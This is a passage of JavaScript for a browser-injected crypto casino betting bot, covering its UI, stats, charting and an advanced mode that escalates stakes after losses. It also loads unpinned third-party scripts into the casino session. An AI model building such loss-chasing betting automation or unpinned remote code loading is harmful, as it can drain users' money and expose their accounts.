                      <tbody id="wdbHistory"></tbody>
                    </table>
                  </div>
              </div>
            </div>
          </div>
        
          <div id="wdbFooter">
            <div class="clearfix">
              <div class="float-left" style="padding-left: 5px; margin-top: 10px;">© Pro Casino Bot</div>
              <div class="float-left" style="padding-left: 5px; margin-top: 10px;"> ★ Contact: https://www.t.me/ProvablyCasinoBot</div>
              <div class="float-left" style="padding-left: 5px; margin-top: 10px;"> ★ Log Message: <span id="logMessage"></span></div>
            </div>
          </div>
        </div>
		`;
function changeMaxRows() {
  maxRows = Number(document.getElementById('wdbMaxRows').value);
  toggleChart('reset');
  toggleHistory("clear");
  toggleLog("clear");
}
function toggleDarkMode() {
  darkMode = !darkMode;
  if (darkMode) {
    // Set background color for .wdb-toggle i and .wdb-toggle.active i:nth-child(2) when dark mode is on
    document.querySelectorAll(".wdb-toggle i").forEach(el => el.style.backgroundColor = "white");
    document.querySelectorAll(".wdb-toggle.active i:nth-child(2)").forEach(el => el.style.backgroundColor = "white");
    document.getElementById("botIcon").src = "https://raw.githubusercontent.com/provablyDice/LogoGIF/main/PCB_Black_Header_Logo_GIF.gif";
    document.getElementById("wdb").style.backgroundColor = "#2a2a2a";
    document.getElementById("wdb").style.color = "#fff";
    chart.options.theme = "dark1";
    chart.render();
    luaEditor.setOption("theme", 'darcula');
    jsEditor.setOption("theme", 'darcula');
    document.querySelector("#wdbWrapVariables pre").style.backgroundColor = '#2a2a2a';
    document.querySelector("#wdbWrapVariables pre").style.color = "#fff";
    document.querySelector("#wdbWrapFunctions pre").style.backgroundColor = "#2a2a2a";
    document.querySelector("#wdbWrapFunctions pre").style.color = "#fff";
    document.querySelector("#wdbWrapTips pre").style.backgroundColor = "#2a2a2a";
    document.querySelector("#wdbWrapTips pre").style.color = '#fff';
    document.querySelectorAll("#wdbWrapHistory table thead tr th").forEach(th => th.style.color = "#2a2a2a");
  } else {
    // Set background color for .wdb-toggle i and .wdb-toggle.active i:nth-child(2) when dark mode is on
    document.querySelectorAll(".wdb-toggle i").forEach(el => el.style.backgroundColor = "black");
    document.querySelectorAll(".wdb-toggle.active i:nth-child(2)").forEach(el => el.style.backgroundColor = "black");
    // Reset color of .wdb-toggle i:nth-child(2) when not active
    document.querySelectorAll('.wdb-toggle i:nth-child(2)').forEach(icon => icon.style.background = 'transparent');
    document.getElementById("botIcon").src = "https://raw.githubusercontent.com/provablyDice/LogoGIF/main/PCB_Header_Logo_GIF.gif";
    document.getElementById("wdb").style.backgroundColor = "LemonChiffon";
    document.getElementById("wdb").style.color = "#000";
    chart.options.theme = 'light';
    chart.render();
    luaEditor.setOption("theme", "default");
    jsEditor.setOption("theme", "default");
    document.querySelector("#wdbWrapVariables pre").style.backgroundColor = "#fff";
    document.querySelector("#wdbWrapVariables pre").style.color = "#000";
    document.querySelector("#wdbWrapFunctions pre").style.backgroundColor = '#fff';
    document.querySelector("#wdbWrapFunctions pre").style.color = "#000";
    document.querySelector("#wdbWrapTips pre").style.backgroundColor = "#fff";
    document.querySelector("#wdbWrapTips pre").style.color = "#000";
    document.querySelectorAll("#wdbWrapHistory table thead tr th").forEach(th => th.style.color = "#000");
  }
  updateStats();
}
function toggleMinimalBot(button) {
    button.classList.toggle('active');
    var wdbMain = document.getElementById("wdbMain");
    var wdbFooter = document.getElementById("wdbFooter");
    var wdb = document.getElementById("wdb");

    if (button.classList.contains('active')) {
      if (darkMode) {
        // Change color of .wdb-toggle i when active & Dark Mode
        document.querySelectorAll('.wdb-toggle i').forEach(icon => icon.style.background = "white");
      } else {
        // Change color of .wdb-toggle i when active & Light Mode
        document.querySelectorAll('.wdb-toggle i').forEach(icon => icon.style.background = "black");
      }
    wdbMain.style.display = 'none';
    wdbFooter.style.display = "none";
    wdb.style.height = "30px";
    wdb.style.width = "350px";
    wdb.style.top = "0vh";
    wdb.style.left = "0vh";
    wdb.style.position = "fixed";
    } else {
    // Reset color of .wdb-toggle i:nth-child(2) when not active
    var wdbToggleChildIcon = document.querySelectorAll('.wdb-toggle i:nth-child(2)');
    wdbToggleChildIcon.forEach(function(icon) {
        icon.style.background = 'transparent';
    });
    wdbMain.style.display = "block";
    wdbFooter.style.display = "block";
    wdb.style.height = "auto";
    wdb.style.width = "100%";
    wdb.style.maxWidth = "90%";
    wdb.style.top = '5px';
    wdb.style.left = "5px";
    wdb.style.position = "absolute";
  }
}
function toggleHideControlBot(checkbox) {
    const control = document.getElementById("wdbWrapControl");
    if (checkbox.checked) {
        control.style.display = 'none'; // Hide the control
    } else {
        control.style.display = 'flex'; // Show the control
    }
    /*if (button.innerText === '▲') {
        document.getElementById("wdbWrapControl").style.display = 'none';
        button.innerText = '▼';
    } else {
        document.getElementById("wdbWrapControl").style.display = 'flex';
        button.innerText = '▲';
    }*/
}
function drawSelectCoin() {
  let coinOptions = '';
  coins.map(coin => {
    coinOptions += "<option value=\"" + coin + "\">" + coin + "</option>";
  });
  document.getElementById("wdbMenuCoin").innerHTML = coinOptions;
  currency = String(coin).toLowerCase();
  fengari.load("currency=\"" + currency + "\"")();
}
async function wdbCreateUI() {
  const wdbWrapper = document.createElement('div');
  wdbWrapper.id = 'wdbWrap';
  wdbWrapper.innerHTML = wdbUI;
  document.body.prepend(wdbWrapper);
  const wdbElement = document.getElementById("wdb");
  let isDragging = false;
  let dragStartX, dragStartY;
  
  function onDragMove(event) {
    if (isDragging) {
      let clientX = event.clientX || event.touches[0].clientX;
      let clientY = event.clientY || event.touches[0].clientY;
      wdbElement.style.left = (clientX - dragStartX) + 'px';
      wdbElement.style.top = (clientY - dragStartY) + 'px';
    }
  }
  function onDragStart(event) {
    isDragging = true;
    dragStartX = (event.clientX || event.touches[0].clientX) - wdbElement.offsetLeft;
    dragStartY = (event.clientY || event.touches[0].clientY) - wdbElement.offsetTop;
    document.addEventListener('mousemove', onDragMove);
    document.addEventListener('mouseup', onDragEnd);
    document.addEventListener('touchmove', onDragMove);
    document.addEventListener('touchend', onDragEnd);
  }
  function onDragEnd() {
    isDragging = false;
    document.removeEventListener('mousemove', onDragMove);
    document.removeEventListener('mouseup', onDragEnd);
    document.removeEventListener('touchmove', onDragMove);
    document.removeEventListener('touchend', onDragEnd);
  }
  document.getElementById('wdbHeader').addEventListener('mousedown', onDragStart);
  document.getElementById('wdbFooter').addEventListener('mousedown', onDragStart);
  document.getElementById('wdbHeader').addEventListener('touchstart', onDragStart);
  document.getElementById('wdbFooter').addEventListener('touchstart', onDragStart);
  if (document.getElementById("wdbWrapLicenseBox")) {
    document.getElementById("wdbWrapLicenseBox").remove();
  }
  if (document.getElementById("wdbWrapInitializing")) {
    document.getElementById("wdbWrapInitializing").remove();
  }
  luaEditor = CodeMirror.fromTextArea(document.getElementById('wdbScriptBoxLUA'), {
    'theme': "default",
    'mode': "lua",
    'lineNumbers': true
  });
  luaEditor.save();
  jsEditor = CodeMirror.fromTextArea(document.getElementById("wdbScriptBoxJS"), {
    'theme': "default",
    'mode': "javascript",
    'lineNumbers': true
  });
  jsEditor.save();
  wdbSpeed = new MySpeed();
  wdbTimer = new easytimer.Timer();
  wdbTimer.addEventListener('secondsUpdated', () => {
    const timeValue = wdbTimer.getTimeValues().days + ':' + wdbTimer.getTimeValues().hours + ':' + wdbTimer.getTimeValues().minutes + ':' + wdbTimer.getTimeValues().seconds;
    document.getElementById("wdbTime").innerText = timeValue;
  });
  document.getElementById("wdbControlMenu").style.display = "none";
  document.getElementById("wdbTabMenu").style.display = "none";
  document.getElementById("wdbWrapMode").style.display = "none";
  document.getElementById("wdbLUAMode").style.display = "none";
  document.getElementById("wdbAdvancedMode").style.display = "none";
  document.getElementById("wdbWrapLog").style.display = "none";
  document.getElementById("wdbWrapVariables").style.display = "none";
  document.getElementById("wdbWrapFunctions").style.display = "none";
  document.getElementById('wdbWrapTips').style.display = "none";
  document.getElementById("wdbShowMode").disabled = true;
  const luaFileSelector = document.getElementById("wdbOpenLUAScript");
  luaFileSelector.addEventListener('click', function () {
    luaFileSelector.value = null;
  });
  luaFileSelector.addEventListener("change", async event => {
    const luaScript = await new Response(event.target.files[0]).text();
    if (!luaScript) {
      return;
    }
    luaEditor.setValue(luaScript);
  });
  const jsFileSelector = document.getElementById('wdbOpenJSScript');
  jsFileSelector.addEventListener("click", function () {
    jsFileSelector.value = null;
  });
  jsFileSelector.addEventListener('change', async event => {
    const jsScript = await new Response(event.target.files[0]).text();
    if (!jsScript) {
      return;
    }
    jsEditor.setValue(jsScript);
  });
  return drawChart();
}
const canvasjsScript = `

`;
async function wdbLoader(fetchFunc, appendStyleFunc) {
  await fetchFunc("https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.5/axios.min.js");
  await appendStyleFunc("https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.css");
  await appendStyleFunc('https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/theme/darcula.min.css');
  await fetchFunc("https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.js");
  await fetchFunc("https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/lua/lua.min.js");
  await fetchFunc("https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/javascript/javascript.min.js");
  await fetchFunc("https://cdn.jsdelivr.net/npm/fengari-web@0.1.4/dist/fengari-web.min.js");
  await fetchFunc("https://canvasjs.com/assets/script/canvasjs.min.js");
  await fetchFunc("https://cdn.jsdelivr.net/gh/provablyDice/Lib-Casino-Bot@main/easytimerV4.6.0.js");
  await fetchFunc("https://cdn.jsdelivr.net/gh/provablyDice/Lib-Casino-Bot@main/ms.js");
  //await fetchFunc(WDB_LIB + '/ms.js');
  await beforeWork(fetchFunc);
  await wdbCreateUI();
  await getListCoin();
  initLua();
  log("Bot successfully loaded!");
  return "wdbLoader ok";
}
function toggleNav(navType) {
  if (navType === "mode") {
    document.getElementById("wdbWrapMode").style.display = "block";
    document.getElementById("wdbWrapLog").style.display = 'none';
    document.getElementById("wdbWrapVariables").style.display = "none";
    document.getElementById("wdbWrapFunctions").style.display = 'none';
    document.getElementById('wdbWrapTips').style.display = 'none';
    document.getElementById("wdbShowMode").disabled = true;
    document.getElementById("wdbShowLog").disabled = false;
    document.getElementById('wdbShowVariables').disabled = false;
    document.getElementById("wdbShowFunctions").disabled = false;
    document.getElementById("wdbShowTips").disabled = false;
  } else {
    if (navType === "log") {
      document.getElementById('wdbWrapMode').style.display = 'none';
      document.getElementById("wdbWrapLog").style.display = "block";
      document.getElementById("wdbWrapVariables").style.display = 'none';
      document.getElementById('wdbWrapFunctions').style.display = 'none';
      document.getElementById("wdbWrapTips").style.display = 'none';
      document.getElementById("wdbShowMode").disabled = false;
      document.getElementById("wdbShowLog").disabled = true;
      document.getElementById('wdbShowVariables').disabled = false;
      document.getElementById("wdbShowFunctions").disabled = false;
      document.getElementById("wdbShowTips").disabled = false;
    } else {
      if (navType === 'variables') {
        document.getElementById("wdbWrapMode").style.display = "none";
        document.getElementById("wdbWrapLog").style.display = 'none';
        document.getElementById('wdbWrapVariables').style.display = "block";
        document.getElementById("wdbWrapFunctions").style.display = 'none';
        document.getElementById("wdbWrapTips").style.display = 'none';
        document.getElementById("wdbShowMode").disabled = false;
        document.getElementById("wdbShowLog").disabled = false;
        document.getElementById('wdbShowVariables').disabled = true;
        document.getElementById("wdbShowFunctions").disabled = false;
        document.getElementById("wdbShowTips").disabled = false;
      } else {
        if (navType === "functions") {
          document.getElementById("wdbWrapMode").style.display = "none";
          document.getElementById("wdbWrapLog").style.display = 'none';
          document.getElementById("wdbWrapVariables").style.display = 'none';
          document.getElementById("wdbWrapFunctions").style.display = "block";
          document.getElementById("wdbWrapTips").style.display = 'none';
          document.getElementById("wdbShowMode").disabled = false;
          document.getElementById("wdbShowLog").disabled = false;
          document.getElementById('wdbShowVariables').disabled = false;
          document.getElementById("wdbShowFunctions").disabled = true;
          document.getElementById("wdbShowTips").disabled = false;
        } else if (navType === "tips") {
          document.getElementById("wdbWrapMode").style.display = 'none';
          document.getElementById("wdbWrapLog").style.display = "none";
          document.getElementById("wdbWrapVariables").style.display = 'none';
          document.getElementById("wdbWrapFunctions").style.display = 'none';
          document.getElementById('wdbWrapTips').style.display = "block";
          document.getElementById("wdbShowMode").disabled = false;
          document.getElementById("wdbShowLog").disabled = false;
          document.getElementById('wdbShowVariables').disabled = false;
          document.getElementById("wdbShowFunctions").disabled = false;
          document.getElementById("wdbShowTips").disabled = true;
        }
      }
    }
  }
}
function toggleShow(target) {
  if (target === "stats") {
    if (document.getElementById("wdbToggleShowStats").checked) {
      selectFunction('showstats');
    } else {
      selectFunction("hidestats");
    }
  } else {
    if (target === "chart") {
      if (document.getElementById("wdbToggleShowChart").checked) {
        selectFunction("showchart");
      } else {
        selectFunction("hidechart");
      }
    } else if (target === "history") {
      if (document.getElementById("wdbToggleShowHistory").checked) {
        selectFunction("showhistory");
      } else {
        selectFunction("hidehistory");
      }
    }
  }
}
function toggleLive(target) {
  if (target === "chart") {
    if (document.getElementById("wdbToggleLiveChart").checked) {
      selectFunction("startchart");
    } else {
      selectFunction("stopchart");
    }
  } else {
    if (target === "history") {
      if (document.getElementById("wdbToggleLiveHistory").checked) {
        selectFunction("starthistory");
      } else {
        selectFunction("stophistory");
      }
    } else if (target === "log") {
      if (document.getElementById("wdbToggleLiveLog").checked) {
        selectFunction("startlog");
      } else {
        selectFunction("stoplog");
      }
    }
  }
}
function selectFunction(func) {
  if (func === 'resetall') {
    resetall();
  }
  if (func === "resetstats") {
    resetstats();
  }
  if (func === "resetchart") {
    toggleChart("reset");
  }
  if (func === "resethistory") {
    toggleHistory("clear");
  }
  if (func === "resetlog") {
    toggleLog("clear");
  }
  if (func === "resetseed") {
    resetseed();
  }
  if (func === 'stopchart') {
    toggleChart('stop');
  }
  if (func === 'startchart') {
    toggleChart("start");
  }
  if (func === "stophistory") {
    toggleHistory("stop");
  }
  if (func === "starthistory") {
    toggleHistory("start");
  }
  if (func === "stoplog") {
    toggleLog("stop");
  }
  if (func === "startlog") {
    toggleLog("start");
  }
  if (func === "hidestats") {
    toggleStats("hide");
  }
  if (func === "showstats") {
    toggleStats("show");
  }
  if (func === "hidechart") {
    toggleChart("hide");
  }
  if (func === "showchart") {
    toggleChart("show");
  }
  if (func === "hidehistory") {
    toggleHistory("hide");
  }
  if (func === "showhistory") {
    toggleHistory("show");
  }
}
function toggleMode(betMode) {
  mode = betMode;
  if (mode === "lua") {
    document.getElementById("wdbLUAMode").style.display = 'block';
    document.getElementById("wdbJSMode").style.display = "none";
    document.getElementById('wdbAdvancedMode').style.display = 'none';
  } else {
    if (mode === 'js') {
      document.getElementById("wdbLUAMode").style.display = "none";
      document.getElementById("wdbJSMode").style.display = 'block';
      document.getElementById('wdbAdvancedMode').style.display = "none";
    } else if (mode === "advanced") {
      document.getElementById("wdbLUAMode").style.display = "none";
      document.getElementById("wdbJSMode").style.display = 'none';
      document.getElementById('wdbAdvancedMode').style.display = 'block';
    }
  }
}
function toggleStats(action) {
  if (action === "hide") {
    document.getElementById('wdbStats').style.display = "none";
  } else if (action === "show") {
    document.getElementById("wdbStats").style.display = "flex";
  }
}
function toggleChart(action) {
  if (action === "hide") {
    document.getElementById("wdbChart").style.display = "none";
    document.getElementById('wdbWrapHistory').style.height = '390px';
  } else {
    if (action === "show") {
      document.getElementById("wdbChart").style.display = "block";
      document.getElementById('wdbWrapHistory').style.height = "190px";
    } else {
      if (action === 'stop') {
        stopChart = true;
      } else {
        if (action === "start") {
          stopChart = false;
        } else if (action === 'reset') {
          betsChart = 0;
          profitChart = 0;
          drawChart();
        }
      }
    }
  }
}
function toggleHistory(action) {
  if (action === "hide") {
    document.getElementById("wdbWrapHistory").style.display = "none";
    document.getElementById('wdbChart').style.height = '390px';
  } else {
    if (action === "show") {
      document.getElementById("wdbWrapHistory").style.display = 'block';
      document.getElementById('wdbChart').style.height = "190px";
    } else {
      if (action === "stop") {
        stopHistory = true;
      } else {
        if (action === "start") {
          stopHistory = false;
        } else if (action === "clear") {
          document.getElementById("wdbHistory").innerHTML = '';
        }
      }
    }
  }
}
function toggleLog(action) {
  if (action === 'stop') {
    stopLog = true;
  } else {
    if (action === "start") {
      stopLog = false;
    } else if (action === "clear") {
      document.getElementById("logMessage").innerHTML = '';
    }
  }
}
async function handleAdvanced() {
  chance = Number(document.getElementById('advancedChance').value);
  chanceOnWinCheck = document.getElementById("advancedChanceOnWinCheck").checked;
  if (chanceOnWinCheck) {
    chanceOnWin = Number(document.getElementById("advancedChanceOnWin").value);
  } else {
    chanceOnWin = chance;
  }
  chanceOnWinBets = Number(document.getElementById("advancedChanceOnWinBets").value);
  chanceOnLoseCheck = document.getElementById('advancedChanceOnLoseCheck').checked;
  if (chanceOnLoseCheck) {
    chanceOnLose = Number(document.getElementById('advancedChanceOnLose').value);
  } else {
    chanceOnLose = chance;
  }
  chanceOnLoseBets = Number(document.getElementById("advancedChanceOnLoseBets").value);
  multiOnWinCheck = document.getElementById('advancedMultiOnWinCheck').checked;
  if (multiOnWinCheck) {
    multiOnWin = Number(document.getElementById("advancedMultiOnWin").value);
  } else {
    multiOnWin = 1;
  }
  multiOnWinBets = Number(document.getElementById("advancedMultiOnWinBets").value);
  multiOnLoseCheck = document.getElementById("advancedMultiOnLoseCheck").checked;
  if (multiOnLoseCheck) {
    multiOnLose = Number(document.getElementById('advancedMultiOnLose').value);
  } else {
    multiOnLose = 1;
  }
  multiOnLoseBets = Number(document.getElementById("advancedMultiOnLoseBets").value);
  betHighOnBetCheck = document.getElementById('advancedBetHighOnBetCheck').checked;
  if (betHighOnBetCheck) {
    betHighOnBet = Number(document.getElementById("advancedBetHighOnBet").value);
    if (bets % betHighOnBet === 0) {
      bethigh = !bethigh;
    }
  }
  betHighOnProfitCheck = document.getElementById("advancedBetHighOnProfitCheck").checked;
  if (betHighOnProfitCheck) {
    betHighOnProfit = Number(document.getElementById("advancedBetHighOnProfit").value);
    if (profit >= betHighOnProfit) {
      bethigh = !bethigh;
    }
  }
  resetstatsOnProfitCheck = document.getElementById("resetstatsOnProfitCheck").checked;
  if (resetstatsOnProfitCheck) {
    resetstatsOnProfit = Number(document.getElementById("resetstatsOnProfit").value);
    if (profit >= resetstatsOnProfit) {
      resetstats();
    }
  }
  stopRollNumberCheck = document.getElementById('advancedStopRollNumberCheck').checked;
  if (stopRollNumberCheck) {
    stopRollNumber = Number(document.getElementById("advancedStopRollNumber").value);
    if (lastBet.result === stopRollNumber) {
      stop();
      log("Stop on roll number " + stopRollNumber);
    }
  }
  stopStreakCheck = document.getElementById("advancedStopAfterStreakCheck").checked;
  if (stopStreakCheck) {
    stopStreak = Number(document.getElementById('advancedStopAfterStreak').value);
    if (stopStreak > 0) {
      if (currentstreak >= stopStreak) {
        stop();
        log("Stop on current streak " + stopStreak);
      }
    } else {
      if (currentstreak <= stopStreak) {
        stop();
        log("Stop on current streak " + stopStreak);
      }
    }
  }
  stopOnBetsCheck = document.getElementById("advancedStopOnBetsCheck").checked;
  if (stopOnBetsCheck) {
    stopOnBets = Number(document.getElementById("advancedStopOnBets").value);
    if (bets >= stopOnBets) {
      stop();
      log("Stop on " + stopOnBets + " bet");
    }
  }
  stopOnWinsCheck = document.getElementById("advancedStopOnWinsCheck").checked;
  if (stopOnWinsCheck) {
    stopOnWins = Number(document.getElementById("advancedStopOnWins").value);
    if (winstreak >= stopOnWins) {
      stop();
      log("Stop on " + stopOnWins + " win");
    }
  }
  stopOnLoseCheck = document.getElementById("advancedStopOnLoseCheck").checked;
  if (stopOnLoseCheck) {
    stopOnLose = Number(document.getElementById("advancedStopOnLose").value);
    if (losestreak >= stopOnLose) {
      stop();
      log("Stop on " + stopOnLose + " lose");
    }
  }
  stopOnProfitCheck = document.getElementById("stopOnProfitCheck").checked;
  if (stopOnProfitCheck) {
    stopOnProfit = Number(document.getElementById('stopOnProfit').value);
    if (profit >= stopOnProfit) {
      stop();
      log("Stop on profit " + stopOnProfit);
    }
  }
  stopOnBalanceCheck = document.getElementById('stopOnBalanceCheck').checked;
  if (stopOnBalanceCheck) {
    stopOnBalance = Number(document.getElementById('stopOnBalance').value);
    if (balance >= stopOnBalance) {
      stop();
      log("Stop on balance " + stopOnBalance);
    }
  }
  if (win) {
    betHighOnWinCheck = document.getElementById("advancedBetHighOnWinCheck").checked;
    if (betHighOnWinCheck) {
      betHighOnWin = Number(document.getElementById("advancedBetHighOnWin").value);
      if (winstreak % betHighOnWin === 0) {
        bethigh = !bethigh;
      }
    }
    if (winstreak % chanceOnWinBets === 0) {
      chance = chanceOnWin;
    }
    if (multiOnWinCheck) {
      if (winstreak % multiOnWinBets === 0) {
        nextbet = previousbet * multiOnWin;
      }
    } else {
      nextbet = basebet;
    }
  } else {
    betHighOnLoseCheck = document.getElementById('advancedBetHighOnLoseCheck').checked;
    if (betHighOnLoseCheck) {
      betHighOnLose = Number(document.getElementById("advancedBetHighOnLose").value);
      if (losestreak % betHighOnLose === 0) {
        bethigh = !bethigh;
      }
    }
    if (losestreak % chanceOnLoseBets === 0) {
      chance = chanceOnLose;
    }
    if (multiOnLoseCheck) {
      if (losestreak % multiOnLoseBets === 0) {
        nextbet = previousbet * multiOnLose;
      }
    } else {
      nextbet = basebet;
    }
  }
  return "handleAdvanced ok";
}
function changeCoin() {
  coin = document.getElementById('wdbMenuCoin').value;
  currency = String(coin).toLowerCase();
  fengari.load("currency=\"" + currency + "\"")();
  checkbalance();
}
async function handleStats() {
  bets++;
  betsChart++;
  wdbSpeed.bets++;
  lastBet.target = target;
  lastBet.Target = target;
  lastBet.result = result;
  lastBet.Result = result;
  lastBet.profit = currentprofit;
  lastBet.Profit = currentprofit;
  lastBet.Nonce = lastBet.nonce;
  lastBet.Id = lastBet.id;
  balance += currentprofit;
  profit += currentprofit;
  profitChart += currentprofit;
  wagered += nextbet;
  partialprofit += currentprofit;
  if (game === "dice") {
    if (lastBet.bethigh) {
      if (lastBet.result > lastBet.target) {
        win = true;
      } else {
        win = false;
      }
    } else if (lastBet.result < lastBet.target) {
      win = true;
    } else {
      win = false;
    }
  } else {
    if (game === "plinko") {
      if (lastBet.profit > 0) {
        win = true;
      } else {
        win = false;
      }
    } else if (lastBet.result >= lastBet.target) {
      win = true;
    } else {
      win = false;
    }
  }
  if (win) {
    color = "lime";
    wins++;
    winstreak++;
    losestreak = 0;
    currentstreak = winstreak;
  } else {
    color = 'tomato';
    losses++;
    losestreak++;
    winstreak = 0;
    currentstreak = 0 - losestreak;
    if (previousbet > maxLosseAmount) {
      maxLosseAmount = previousbet;
    }
  }
  if (nextbet > maxBetAmount) {
    maxBetAmount = nextbet;
  }
  if (winstreak > maxwinstreak) {
    maxwinstreak = winstreak;
  }
  if (losestreak > maxlosestreak) {
    maxlosestreak = losestreak;
  }
  if (balance < minbalance) {
    minbalance = balance;
  }
  if (balance > maxbalance) {
    maxbalance = balance;
  }
  if (profit < minprofit) {
    minprofit = profit;
  }
  if (profit > maxprofit) {
    maxprofit = profit;
  }
  const updateStatsPromise = await updateStats();
  const updateChartPromise = await updateChart(betsChart, profitChart, color);
  const updateHistoryPromise = await updateHistory(bets, lastBet);
  Promise.all([updateStatsPromise, updateChartPromise, updateHistoryPromise]).then(async results => {
    try {
      if (mode === "lua") {
        await updateLua();
      } else {
        if (mode === 'js') {
          await dobet();
        } else if (mode === "advanced") {
          await handleAdvanced();
        }
      }
      if (win && sOW) {
        return stop();
      }
      if (run) {
        return playBet();
      }
    } catch (error) {
      stop();
      log(error);
    }
  });
}
async function updateStats() {
  document.getElementById("wdbWebsite").innerText = location.hostname.replace('www.', '');
  document.getElementById("wdbCryptoCurrency").innerText = String(currency).toUpperCase();
  const profitColor = profit === 0 ? (darkMode ? "white" : "black") : (profit < 0 ? "tomato" : "lime");
  const streakColor = currentstreak === 0 ? (darkMode ? "white" : "black") : (currentstreak < 0 ? "tomato" : "lime");
  const winStreakColor = maxwinstreak > 0 ? "lime" : "black";
  document.getElementById("wdbHighWinStreak").style.color = winStreakColor;
  const loseStreakColor = maxlosestreak > 0 ? "tomato" : "black";
  document.getElementById("wdbHighLoseStreak").style.color = loseStreakColor;
  document.getElementById("wdbWagered").innerText = wagered.toFixed(decimalAmountView);
  document.getElementById("wdbBalance").innerText = balance.toFixed(decimalAmountView);
  document.getElementById("wdbProfit").style.color = profitColor;
  document.getElementById("wdbProfit").innerText = profit.toFixed(decimalAmountView);
  document.getElementById("wdbHighBet").innerText = maxBetAmount.toFixed(decimalAmountView);
  document.getElementById("wdbHighLose").innerText = maxLosseAmount.toFixed(decimalAmountView);
  document.getElementById("wdbBets").innerText = bets;
  document.getElementById("wdbWins").innerText = wins;
  document.getElementById("wdbLosses").innerText = losses;
  document.getElementById("wdbCurrentStreak").style.color = streakColor;
  document.getElementById("wdbCurrentStreak").innerText = currentstreak;
  document.getElementById("wdbHighWinStreak").innerText = maxwinstreak;
  document.getElementById("wdbHighLoseStreak").innerText = maxlosestreak;
  //document.getElementById('wdbMinBalance').innerText = minbalance.toFixed(decimalAmountView);
  document.getElementById("wdbMaxBalance").innerText = maxbalance.toFixed(decimalAmountView);
  //document.getElementById("wdbMinProfit").innerText = minprofit.toFixed(decimalAmountView);
  document.getElementById("wdbMaxProfit").innerText = maxprofit.toFixed(decimalAmountView);
  percentWagered = wagered / startBalance;
  percentWagered = Math.round((percentWagered + Number.EPSILON) * 100) / 100;
  if (String(percentWagered) === "Infinity" || String(percentWagered) === "NaN") {
    percentWagered = 0;
  }
  document.getElementById("wdbPercentWagered").innerText = percentWagered;
  percentProfit = profit / startBalance * 100;
  percentProfit = Math.round((percentProfit + Number.EPSILON) * 100) / 100;
  if (String(percentProfit) === "Infinity" || String(percentProfit) === "NaN") {
    percentProfit = 0;
  }
  document.getElementById("wdbWrapPercentProfit").style.color = profitColor;
  document.getElementById("wdbPercentProfit").innerText = percentProfit;
  return "updateStats ok";
}
function drawChart() {
  dps = [{
    'x': 0,
    'y': 0
  }];
  chart = new CanvasJS.Chart("wdbChart", {
    'theme': darkMode ? "dark1" : "light1",
    'axisY': {
      'includeZero': false
    },
    'data': [{
      'type': "line",
      'markerSize': 0,
      'dataPoints': dps
    }]
  });
  chart.render();
}
async function updateChart(betsChart, profitChart, color) {
  if (!stopChart) {
    dps.push({
      'x': betsChart,
      'y': profitChart,
      'c': color
    });
    if (dps.length > maxRows) {
      dps.shift();
    }
    if (dps[dps.length - 2]) {
      dps[dps.length - 2].lineColor = color;
    }
    chart.render();
  }
  return "updateChart ok";
}
async function updateHistory(bets, lastBet) {
  if (!stopHistory) {
    const comparisonSymbol = game === "dice" ? lastBet.bethigh ? '>' : '<' : '>';
    const betHighCheckbox = lastBet.bethigh ? "<input id=\"bethigh" + bets + "\" type=\"checkbox\" checked />" : "<input id=\"bethigh" + bets + "\" type=\"checkbox\" />";
    const plinkoInfo = '' + (havePlinkoRows ? plinkoRow + " | " : '') + plinkoRisk;
    const tableRowContent = "<td>" + bets + "</td>\n      <td>" + Number(lastBet.amount).toFixed(decimalAmountView) + "</td>\n      <td>" + Number(lastBet.target).toFixed(2) + "</td>\n      <td>" + Number(result).toFixed(2) + "</td>\n      <td>" + Number(lastBet.profit).toFixed(decimalAmountView) + "</td>\n      <td>" + lastBet.nonce + "</td>";
    const newRow = document.createElement('tr');
    if (win) {
      newRow.style.backgroundColor = "Lime";
    } else {
      newRow.style.backgroundColor = "Tomato";
    }
    newRow.innerHTML = tableRowContent;
    document.getElementById("wdbHistory").insertBefore(newRow, document.getElementById("wdbHistory").children[0]);
    const tableRows = document.querySelector('#wdbHistory').rows;
    if (tableRows.length > maxRows) {
      document.querySelector('#wdbHistory').lastChild.remove();
    }
  }
  return "updateHistory ok";
}
function log(message) {
  const logElement = document.getElementById("logMessage");
  logElement.textContent = message;
  /*const newListItem = document.createElement('li');
  newListItem.innerText = '' + message;
  document.getElementById("wdbLog").insertBefore(newListItem, logElement.children[0]);
  const listItems = logElement.getElementsByTagName('li');
  if (listItems.length > maxRows) {
    document.getElementById("wdbLog").removeChild(logElement.lastChild);
  }*/
}
async function start() {
  try {
    if (!run) {
      document.getElementById("wdbTime").innerText = "0:0:0:0";
      document.getElementById('wdbMenuCoin').disabled = true;
      document.getElementById('wdbGameMode').disabled = true;
      document.getElementById("wdbStartButton").disabled = true;
      document.getElementById("wdbResumeButton").disabled = true;
      document.querySelectorAll("#wdbSaveScriptButton").forEach(button => button.disabled = true);
      document.querySelectorAll("#wdbOpenScript").forEach(button => button.disabled = true);
      run = true;
      sOW = false;
      wdbTimer.stop();
      wdbTimer.start();
      wdbSpeed.stop();
      wdbSpeed.start();
      if (mode === "lua") {
        diceScript = luaEditor.getValue();
        diceScript = diceScript.replace(/!=/g, '~=').replace(/!/g, "not ").replace(/([a-zA-Z]*[0-9]*\s*)\+\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1+$2 ").replace(/([a-zA-Z]*[0-9]*\s*)\-\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1-$2 ").replace(/([a-zA-Z]*[0-9]*\s*)\*\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1*$2 ").replace(/([a-zA-Z]*[0-9]*\s*)\/\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1/$2 ");
        fengari.load(diceScript)();
      } else {
        if (mode === 'js') {
          if (document.getElementById("wdbRunningScript") !== null) {
            document.getElementById('wdbRunningScript').remove();
          }
